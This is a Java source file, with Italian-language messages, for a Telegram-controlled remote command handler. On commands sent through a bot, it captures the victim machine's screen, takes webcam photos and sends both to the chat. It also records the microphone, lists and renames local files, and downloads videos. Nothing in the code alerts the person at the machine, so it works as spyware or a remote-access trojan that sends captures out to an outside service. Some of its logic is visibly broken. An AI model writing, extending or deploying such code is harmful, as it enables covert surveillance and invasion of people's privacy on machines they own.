package me.Elitcody;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import javax.imageio.ImageIO;

import com.pengrad.telegrambot.TelegramBot;
import com.pengrad.telegrambot.TelegramBotAdapter;
import com.pengrad.telegrambot.model.Audio;
import com.pengrad.telegrambot.model.Message;
import com.pengrad.telegrambot.model.Update;
import com.pengrad.telegrambot.model.Voice;
import com.pengrad.telegrambot.request.GetUpdates;
import com.pengrad.telegrambot.response.GetUpdatesResponse;

public class cmdhandler extends Thread {
	public static int oldMessageID = 0;
	public static int delay = 30;
	public static boolean isrecording = false;
	private static ArrayList<String> messages = new ArrayList<String>();
	
	public static void checkCommand(String message,TelegramBot bot, int chatId){
		if(message.startsWith("/screenshoot")){
			Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
			BufferedImage capture = null;
			try {
				capture = new Robot().createScreenCapture(screenRect);
			} catch (AWTException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
			try {
				ImageIO.write(capture, "bmp", new File(main.baseDIRECTORY+"/screen.bmp"));
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			main.sendPhoto(bot, chatId, new File(main.baseDIRECTORY+"/screen.bmp"));
		}
		if(message.startsWith("/setdelay"))
		{
			String[] s = message.split(" ");
			delay = Integer.valueOf(s[1]);
			if(!(delay == Integer.valueOf(s[1]))){
				main.sendMsg(bot, chatId, "Il delay del comando è stato impostato ogni "+s[1]+"s");
				System.out.print("\n Attivazione in corso nuovo delay: "+s[1]+"\n");
			}
		}
		if(message.startsWith("/rec"))
		{
			microphonehandler m = new microphonehandler();
			if(!isrecording)
			{
				main.sendMsg(bot, chatId, "Mi dia solo una guardia carceraria e sono subito da lei.");
				try {
					microphonehandler.inizializate();
				} catch (Exception e) {
					e.printStackTrace();
				}
				isrecording=true;
			}else{
				main.sendMsg(bot, chatId, "Il programma sta registrando attendi...");
			}
		}
		if(message.startsWith("/help"))
		{
			main.sendMsg(bot, chatId, "Tra i comandi attualmente disponibili:");
			main.sendMsg(bot, chatId, "- /startscreen (ha la funzione di far una foto dalla webcam)");
			main.sendMsg(bot, chatId, "- /setdelay 10 (ogni quanto si vuole far ricevere un comando) ");
			main.sendMsg(bot, chatId, "- /lock (Per far avviare o disattivare i comandi)");
			main.sendMsg(bot, chatId, "- /rec (Per far una registrazione di 1 minuto)");
			main.sendMsg(bot, chatId, "- /youtubedw url (Per far scaricare un video da youtube)");
			main.sendMsg(bot, chatId, "- /renominate nome_vecchiofile_ nuovo_nomefile (rinomina i file)");
			
		}
		if(message.startsWith("/renominate"))
		{
			String[] msg = message.split(" ");
			if(msg.length < 3){main.sendMsg(bot, chatId, "Errore sintassi scrivi /renominate nome_vecchiofile_ nuovo_nomefile ");}
			if(msg.length==3){
				File oldFile = new File(main.baseDIRECTORY+"/"+msg[1]);
				if(oldFile.exists())
				{
					oldFile.renameTo(new File(msg[2]));
					main.sendMsg(bot, chatId, "File rinominato con successo!");
						
				}else{
					main.sendMsg(bot, chatId, "File non esistente");
				}
			}
		}
		if(message.startsWith("/youtubedw"))
		{
			String[] msg = message.split(" ");
			if(msg.length < 2){main.sendMsg(bot, chatId, "Errore sintassi scrivi /youtubedw url");}
			if(msg.length == 2){
				youtubedownloader yt = new youtubedownloader();
				yt.download(msg[1]);
			}
		}
		if(message.startsWith("/playaudio"))
		{
			audiomanager audio = new audiomanager();
			String[] msg = message.split(" ");
				if(msg.length == 1)
				{
					main.sendMsg(bot, chatId, "Lista dei file presenti: ");
					StringBuilder st = new StringBuilder();
					File directory = new File(main.baseDIRECTORY);
					try {
						directory.getAbsoluteFile();
						
						for(File file : directory.listFiles())
						{
							st.append(file.getName()+"-----");
						}
						main.sendMsg(bot, chatId,st.toString());
					} catch (Exception e) {
						e.printStackTrace();
					}
				}else{
					audio.handler(msg[1]);
				}
		}
		if(message.startsWith("/takephoto")){
			main.sendMsg(bot, chatId, "Non dire altro!");
			camhandler photofromcamera = new camhandler();
			// C:/Users/PC-ITALIA/Desktop/Test.jpeg
			main.sendMsg(bot, chatId, "Sto facendo la foto attendi 3 secondi!");
			main.sendPhoto(bot, chatId, new File(main.baseDIRECTORY+"/Test.jpeg"));
		}
	}
	public static ArrayList<String> getLastMessages(){
		return messages;
	}
	public synchronized void run() {
		while(true)
		{
			final TelegramBot bot = TelegramBotAdapter.build("TOKENAPI");
			int chatId = CHATID;
			GetUpdatesResponse updatesResponse = bot.execute(new GetUpdates());
			List<Update> updates = updatesResponse.updates();
			
			if(updates.get(updates.size()-1).toString().contains("voice=null")){

				Message msgfromupdates = updates.get(updates.size()-1).message();
				String message = msgfromupdates.text().toLowerCase();
				
				
				int newmessage = updates.get(updates.size()-1).message().messageId();
				if(cmdhandler.oldMessageID != newmessage)
				{
					if(!msgfromupdates.text().startsWith("/")){
						messages.add(msgfromupdates.text());
					}
					cmdhandler.checkCommand(message, bot, chatId);
					System.out.print("\n"+message+"\n[Old]"+cmdhandler.oldMessageID+"\n[NEW]"+updates.get(updates.size()-1).message().messageId());
					cmdhandler.oldMessageID = updates.get(updates.size()-1).message().messageId();
					System.out.print("\n"+message+"\n[Old]"+cmdhandler.oldMessageID+"\n[NEW]"+updates.get(updates.size()-1).message().messageId());
				}	
			}
			
			 try{Thread.sleep(1000);} // 1 second pause 
			 catch(Exception e){}
		}
	}
}